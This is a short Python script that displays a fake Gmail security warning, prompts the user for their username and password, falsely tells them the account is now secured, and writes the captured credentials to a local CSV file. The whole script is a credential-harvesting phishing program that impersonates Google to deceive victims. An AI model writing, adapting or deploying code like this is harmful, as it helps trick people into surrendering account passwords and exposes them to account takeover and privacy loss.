def main():
    print("Your Gmail.com password has been compromised. Please enter your username and passcode so we can fix the problem.")
    username = input("Username: ")
    password = input("Password: ")
    print("Your account has been secured\nRestart device to fix problem")
    with open("user_info.csv", "a") as file:
        file.write(f"{username},{password}\n")

main()